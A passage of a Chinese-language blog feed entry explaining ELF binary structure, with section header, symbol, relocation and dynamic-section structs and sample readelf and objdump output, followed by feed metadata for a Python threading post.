class="line">  Elf32_Word    sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word    sh_flags;               <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr    sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off     sh_offset;              <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word    sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word    sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word    sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word    sh_addralign;           <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word    sh_entsize;             <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><blockquote><p>可以看出段表的每一个段的信息大小都是固定的<code>10*4=40</code>个字节，用<code>readelf -S test</code>，查看实例中的ELF文件的段表，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">There are 30 section headers, starting at offset 0x3830:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        00000194 000194 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.gnu.bu[...] NOTE            000001a8 0001a8 000024 00   A  0   0  4</span><br><span class="line">  [ 3] .note.ABI-tag     NOTE            000001cc 0001cc 000020 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        000001ec 0001ec 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          0000020c 00020c 000090 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0000029c 00029c 0000b6 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          00000352 000352 000012 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         00000364 000364 000040 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             000003a4 0003a4 000040 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             000003e4 0003e4 000018 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        00001000 001000 000020 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        00001020 001020 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        00001060 001060 000008 08  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        00001070 001070 000275 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        000012e8 0012e8 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        00002000 002000 00007b 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        0000207c 00207c 000054 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        000020d0 0020d0 000160 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      00003ef4 002ef4 000004 04  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      00003ef8 002ef8 000004 04  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         00003efc 002efc 0000f0 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        00003fec 002fec 000014 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        00004000 003000 000018 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        00004018 003018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          00004020 003020 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 003020 00001e 01  MS  0   0  1</span><br><span class="line">  [27] .symtab           SYMTAB          00000000 003040 000470 10     28  45  4</span><br><span class="line">  [28] .strtab           STRTAB          00000000 0034b0 00027a 00      0   0  1</span><br><span class="line">  [29] .shstrtab         STRTAB          00000000 00372a 000105 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure><blockquote><p>一共有30个段，验证了ELF文件头的<code>Number of section headers: 30</code>，那么整个段表的大小就是：段的个数*每个段信息的固定大小，该实例中段表的大小为：<code>30\*40=1200</code>。</p></blockquote><p><img src="/images/150-6.png" alt></p><p>ELF文件结构示意图中定义的<code>Elf_Shdr</code>的各个成员的含义与readelf具有对应关系。如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>节名<br><font size="2" color="navy">节名是一个字符串，保存在一个名为<code>.shstrtab</code>的字符串表（可通过Section Header索引到）。<br>sh_name的值实际上是其节名字符串在<code>.shstrtab</code>中的偏移值</font></td></tr><tr><td>sh_type</td><td>节类型</td></tr><tr><td>sh_flags</td><td>节标志位</td></tr><tr><td>sh_addr</td><td>节地址：节的虚拟地址<br><font size="2" color="navy">如果该节可以被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址；否则sh_addr为0</font></td></tr><tr><td>sh_offset</td><td>节偏移<br><font size="2" color="navy"><strong>如果该节存在于文件中，则表示该节在文件中的偏移；否则无意义，如sh_offset对于BSS 节来说是没有意义的</strong></font></td></tr><tr><td>sh_size</td><td>节大小</td></tr><tr><td>sh_link、sh_info</td><td>节链接信息</td></tr><tr><td>sh_addralign</td><td>节地址对齐方式</td></tr><tr><td>sh_entsize</td><td>节项大小<br><font size="2" color="navy">有些节包含了一些固定大小的项，如符号表，其包含的每个符号所在的大小都一样的，对于这种节，sh_entsize表示每个项的大小。<br><strong>如果为0，则表示该节不包含固定大小的项。</strong></font></td></tr></tbody></table></div><h4 id="①-节类型（sh-type）"><a href="#①-节类型（sh-type）" class="headerlink" title="① 节类型（sh_type）"></a>① 节类型（sh_type）</h4><blockquote><p>节名是一个字符串，只是在链接和编译过程中有意义，但它并不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）。</p></blockquote><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。常见的节类型如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>无效节</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。代码节、数据节都是这种类型。</td></tr><tr><td><strong>SHT_SYMTAB</strong></td><td>2</td><td><strong>符号表</strong></td></tr><tr><td><strong>SHT_STRTAB</strong></td><td>3</td><td><strong>字符串表</strong></td></tr><tr><td>SHT_RELA</td><td>4</td><td><strong>重定位表</strong>。该节包含了重定位信息</td></tr><tr><td>SHT_HASH</td><td>5</td><td><strong>符号表的哈希表</strong></td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>动态链接信息</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>提示性信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容。如<code>.bss</code>节</td></tr><tr><td>SHT_REL</td><td>9</td><td>该节包含了重定位信息</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>保留</td></tr><tr><td>SHT_DNYSYM</td><td>11</td><td><strong>动态链接的符号表</strong></td></tr></tbody></table></div><h4 id="②-节标志位（sh-flag）"><a href="#②-节标志位（sh-flag）" class="headerlink" title="② 节标志位（sh_flag）"></a>② 节标志位（sh_flag）</h4><p>节标志位表示该节在进程虚拟地址空间中的属性。如是否可写、是否可执行等。相关常量以<code>SHF_</code>开头。常见的节标志位如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>2</td><td>表示该节在进程空间中需要分配空间。<br>有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>4</td><td>表示该节在进程空间中可以被执行</td></tr></tbody></table></div><h3 id="4-节的分类"><a href="#4-节的分类" class="headerlink" title="4.节的分类"></a>4.节的分类</h3><p>上述ELF Section Header Table部分已经简单介绍了节类型。接下来我们来介绍详细一些比较重要的节。</p><h4 id="①-text节"><a href="#①-text节" class="headerlink" title="① .text节"></a>① .text节</h4><p><code>.text</code>节是保存了程序代码指令的<strong>代码节</strong>。<strong>一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中</strong>。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><img src="/images/150-7.png" alt></p><h4 id="②-rodata节"><a href="#②-rodata节" class="headerlink" title="② .rodata节"></a>② .rodata节</h4><p><code>rodata</code>节保存了只读的数据，如一行C语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="③-plt节（过程链接表）"><a href="#③-plt节（过程链接表）" class="headerlink" title="③ .plt节（过程链接表）"></a>③ .plt节（过程链接表）</h4><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，<strong>其包含了动态链接器调用从共享库导入的函数所必需的相关代码</strong>。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="④-data节"><a href="#④-data节" class="headerlink" title="④ .data节"></a>④ .data节</h4><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑤-bss节"><a href="#⑤-bss节" class="headerlink" title="⑤ .bss节"></a>⑤ .bss节</h4><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本省的空间。<strong><code>.bss</code>节保存了未进行初始化的全局数据</strong>。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><h4 id="⑥-got-plt节（全局偏移表-过程链接表）"><a href="#⑥-got-plt节（全局偏移表-过程链接表）" class="headerlink" title="⑥ .got.plt节（全局偏移表-过程链接表）"></a>⑥ .got.plt节（全局偏移表-过程链接表）</h4><p><code>.got</code>节保存了<strong>全局偏移表</strong>。<strong><code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改</strong>。由于<code>.got.plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑦-dynsym节（动态链接符号表）"><a href="#⑦-dynsym节（动态链接符号表）" class="headerlink" title="⑦ .dynsym节（动态链接符号表）"></a>⑦ .dynsym节（动态链接符号表）</h4><p><code>.dynsym</code>节保存在<code>text</code>段中。<strong>其保存了从共享库导入的动态符号表</strong>。节类型为<code>SHT_DYNSYM</code>。</p><h4 id="⑧-dynstr节（动态链接字符串表）"><a href="#⑧-dynstr节（动态链接字符串表）" class="headerlink" title="⑧ .dynstr节（动态链接字符串表）"></a>⑧ .dynstr节（动态链接字符串表）</h4><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><h4 id="⑨-rel-节（重定位表）"><a href="#⑨-rel-节（重定位表）" class="headerlink" title="⑨ .rel.*节（重定位表）"></a>⑨ .rel.*节（重定位表）</h4><p>重定位表保存了重定位相关的信息，<strong>这些信息描述了如何在链接或运行时，对ELF目标文件的某部分或者进程镜像进行补充或修改</strong>。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><h4 id="⑩-hash节"><a href="#⑩-hash节" class="headerlink" title="⑩ .hash节"></a>⑩ .hash节</h4><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><h4 id="⑪-symtab节（符号表）"><a href="#⑪-symtab节（符号表）" class="headerlink" title="⑪ .symtab节（符号表）"></a>⑪ .symtab节（符号表）</h4><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><img src="/images/150-5.png" alt></p><blockquote><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构中成员的含义如下表所示：</p></blockquote><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>符号名。该值为该符号名在字符串表中的偏移地址。</td></tr><tr><td>st_value</td><td>符号对应的值。存放符号的值（可能是地址或位置偏移量）。</td></tr><tr><td>st_size</td><td>符号的大小</td></tr><tr><td>st_other</td><td>0</td></tr><tr><td>st_shndx</td><td>符号所在的节</td></tr><tr><td>st_info</td><td>符号类型及绑定属性</td></tr></tbody></table></div><h4 id="⑫-strtab节（字符串表）"><a href="#⑫-strtab节（字符串表）" class="headerlink" title="⑫ .strtab节（字符串表）"></a>⑫ .strtab节（字符串表）</h4><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><blockquote><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p></blockquote><p>Elf文件中用到的字符串，如段名、函数名、变量名称等，均保存在字符串表中。其中，shstrtab段表字符串表仅用来保存段名，而strtab或dynstr section则是存放普通字符串，如函数、变量名等符号名称，字符串之间以”00”截断。</p><h4 id="⑬-ctors节和-dtors节"><a href="#⑬-ctors节和-dtors节" class="headerlink" title="⑬ .ctors节和.dtors节"></a>⑬ .ctors节和.dtors节</h4><p><code>.ctors</code>（<strong>构造器</strong>）节和<code>.dtors</code>（<strong>析构器</strong>）节分别保存了指向构造函数和析构函数的函数指针，<strong>构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码</strong>。</p><h4 id="⑭-自定义section"><a href="#⑭-自定义section" class="headerlink" title="⑭ 自定义section"></a>⑭ 自定义section</h4><p>在声明一个函数或变量时，可以加上<strong>attribute</strong>((section(“自定义section名”)))前缀的方式，将其添加到自定义段。</p><h3 id="5-ELF（动态）符号-字符串表的联系和区别"><a href="#5-ELF（动态）符号-字符串表的联系和区别" class="headerlink" title="5.ELF（动态）符号/字符串表的联系和区别"></a>5.ELF（动态）符号/字符串表的联系和区别</h3><div class="table-container"><table><thead><tr><th>名称</th><th>作用</th><th>name的值</th></tr></thead><tbody><tr><td>.dynsym</td><td><strong>其保存了从共享库导入的动态符号表</strong>。<br>节类型为<code>SHT_DYNSYM</code>。</td><td>对应.dystr中的偏移</td></tr><tr><td>.symtab</td><td>是一个<code>ElfN_Sym</code>的数组，保存了符号信息。<br>节类型为<code>SHT_SYMTAB</code>。</td><td>对应.strtab中的偏移</td></tr><tr><td>.dystr</td><td>对应于<code>.dynsym</code></td><td>无</td></tr><tr><td>.strtab</td><td>对应于<code>.symtab</code></td><td>无</td></tr><tr><td>.shstrtab</td><td>用于保存<strong>节头表中</strong>用到的字符串，可通过<code>sh_name</code>进行索引。</td><td>无</td></tr></tbody></table></div><h4 id="①-符号表结构"><a href="#①-符号表结构" class="headerlink" title="① 符号表结构"></a>① 符号表结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;               <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;               <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;               <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h3 id="6-重定位表"><a href="#6-重定位表" class="headerlink" title="6.重定位表"></a>6.重定位表</h3><blockquote><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p></blockquote><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -r hello.o</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000005 R_X86_64_32       .rodata</span><br><span class="line">000000000000000a R_X86_64_PC32     puts-0x0000000000000004</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000020 R_X86_64_PC32     .text</span><br></pre></td></tr></table></figure><p>重定位表是一个<code>Elf_Rel</code>类型的数组结构，每一项对应一个需要进行重定位的项。<br>其成员含义如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>▨ 重定位入口的偏移。<br>▨ 对于<strong>可重定位文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移<br>▨ 对于<strong>可执行文件或共享对象文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</td></tr><tr><td>r_info</td><td>▨ 重定位入口的类型和符号<br>▨ 因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。<br>    每种处理器都有自己的一套重定位入口的类型。<br>▨ 对于<strong>可执行文件和共享目标文件</strong>来说，它们的重定位入口是动态链接类型的。</td></tr></tbody></table></div><p>重定位是目标文件链接成为可执行文件的关键。我们将在后面的进行介绍。</p><h3 id="7-与动态链接相关的段表"><a href="#7-与动态链接相关的段表" class="headerlink" title="7.与动态链接相关的段表"></a>7.与动态链接相关的段表</h3><h4 id="①-dynamic"><a href="#①-dynamic" class="headerlink" title="① .dynamic"></a>① .dynamic</h4><blockquote><p>该段保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword   d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                 <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword  d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>d_tag 类型</th><th>d_un 的含义</th></tr></thead><tbody><tr><td>DT_SYMTAB</td><td>动态链接符号表的地址，d_ptr 表示 “.dynsym” 的地址</td></tr><tr><td>DT_STRTAB</td><td>动态链接字符串表的地址，d_ptr 表示 “.dynstr” 的地址</td></tr><tr><td>DT_STRSZ</td><td>动态链接字符串表大小，d_val 表示大小</td></tr><tr><td>DT_HASH</td><td>动态链接哈希表地址， d_ptr 表示 “.hash” 的地址</td></tr><tr><td>DT_SONAME</td><td>本共享对象的 “SO_NAME”</td></tr><tr><td>DT_RPATH</td><td>动态链接共享对象搜索路径</td></tr><tr><td>DT_INIT</td><td>初始化代码地址</td></tr><tr><td>DT_FINIT</td><td>结束代码地址</td></tr><tr><td>DT_NEED</td><td>依赖的共享对象文件，d_ptr表示所以来的共享对象文件名</td></tr><tr><td>DT_REL<br>DT_RELA</td><td>动态链接重定位段表地址</td></tr><tr><td>DT_RELENT<br>DT_RELAENT</td><td>动态重读位表入口数量</td></tr></tbody></table></div><blockquote><p>可以把<code>.dynamic</code>段看成动态链接下ELF文件的文件头</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -d <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2efc contains 26 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x1000</span><br><span class="line"> 0x0000000d (FINI)                       0x12e8</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x3ef4</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3ef8</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x1ec</span><br><span class="line"> 0x00000005 (STRTAB)                     0x29c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x20c</span><br><span class="line"> 0x0000000a (STRSZ)                      182 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x4000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3e4</span><br><span class="line"> 0x00000011 (REL)                        0x3a4</span><br><span class="line"> 0x00000012 (RELSZ)                      64 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: PIE</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x364</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x352</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h4 id="②-dynsym"><a href="#②-dynsym" class="headerlink" title="② .dynsym"></a>② .dynsym</h4><blockquote><p>与.symtab不同的是，“.dynsym” 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存，很多时候动态链接模块同时拥有“.dynsym“和”.symtab“两个表，<font color="navy"><strong>”.symtab“ 中往往保存了所有符号，包括”.dynsym“ 中的符号。</strong></font></p></blockquote><font size="2">和”.symtab“类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接是叫做符号字符串表”.strtab“(String Tab)，在这里就**动态符号字符串表**”.dynstr“(Dynamic String Table)；由于在动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的**符号哈希表**（.hash）</font><h4 id="③-动态链接重定位表-rel"><a href="#③-动态链接重定位表-rel" class="headerlink" title="③ 动态链接重定位表.rel.*"></a>③ 动态链接重定位表.rel.*</h4><blockquote><ul><li>”.rel.dyn“实际上是对数据引用的修正，它所修正的位置位于”.got“以及数据段</li><li>”.rel.plt“是对函数引用的修正，它所修正的位置位域”.got.plt“</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-知识储备&quot;&gt;&lt;a href=&quot;#0x00-知识储备&quot; class=&quot;headerlink&quot; title=&quot;0x00 知识储备&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 知识储备&lt;/font&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-前言&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程介绍</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88149%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（149）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-06T03:15:25.839Z</updated>
    
